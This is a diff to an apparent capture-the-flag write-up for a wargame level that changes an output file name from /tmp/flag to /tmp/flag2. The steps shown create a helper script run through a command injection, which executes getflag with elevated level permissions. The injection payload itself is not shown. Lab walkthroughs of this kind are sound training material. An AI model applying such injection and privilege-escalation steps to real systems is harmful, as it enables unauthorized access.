@@ -86,11 +86,11 @@ We bypass the filter by:
 ### Create the script
 
 ```bash
-echo 'getflag > /tmp/flag' > /tmp/X
+echo 'getflag > /tmp/flag2' > /tmp/X
 chmod +x /tmp/X
 ```
 
-This script will execute getflag and write the result to `/tmp/flag`.
+This script will execute getflag and write the result to `/tmp/flag2`.
 
 ### Exploit the injection
 
@@ -106,7 +106,7 @@ The script is then executed with level12 permissions, allowing getflag to run.
 ## Retrieve the flag
 
 ```bash
-cat /tmp/flag
+cat /tmp/flag2
 ```
 
 The flag is displayed.
